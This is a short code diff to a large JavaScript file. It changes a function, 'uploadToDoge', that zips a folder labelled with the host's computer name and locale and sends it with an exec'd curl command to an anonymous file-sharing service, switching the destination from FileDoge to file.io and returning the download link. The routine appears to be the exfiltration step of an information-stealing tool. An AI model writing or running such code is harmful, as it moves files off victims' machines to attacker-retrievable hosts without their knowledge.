@@ -2861,25 +2861,30 @@ async function uploadToDoge(destinationFolder, locale, computerName) {
             return;
         }
 
-        const uploadCommand = `curl --location --request POST "https://api.filedoge.com/upload" -H "Content-Type: multipart/form-data;" --form "file=@${zipFilePath.replace(/\\/g, '/')}";`;
+const uploadCommand = `curl --location --request POST "https://file.io/" -H "Content-Type: multipart/form-data;" --form "file=@${zipFilePath.replace(/\\/g, '/')}";`;
 
-        exec(uploadCommand, (error, stdout, stderr) => {
-            if (error) {
-                console.error(`Error uploading to FileDoge: ${error}`);
-                reject(error);
+exec(uploadCommand, (error, stdout, stderr) => {
+    if (error) {
+        console.error(`Error uploading to File.io: ${error}`);
+        reject(error);
+    } else {
+        try {
+            const response = JSON.parse(stdout);
+            if (response.success) {
+                const downloadLink = response.link;
+                console.log(`Upload successful to File.io. Download link: ${downloadLink}`);
+                resolve(downloadLink);
             } else {
-                try {
-                    const response = JSON.parse(stdout);
-                    const token = response.token;
-                    const downloadLink = `https://api.filedoge.com/download/${token}`;
-                    console.log(`Upload successful to FileDoge. Download link: ${downloadLink}`);
-                    resolve(downloadLink);
-                } catch (jsonError) {
-                    console.error(`Error parsing JSON response: ${jsonError}`);
-                    reject(new Error('Invalid JSON response from the API'));
-                }
+                console.error(`File.io returned an error: ${response.message}`);
+                reject(new Error(`Error from File.io: ${response.message}`));
             }
-        });
+        } catch (jsonError) {
+            console.error(`Error parsing JSON response: ${jsonError}`);
+            reject(new Error('Invalid JSON response from the API'));
+        }
+    }
+});
+
     });
 }
 
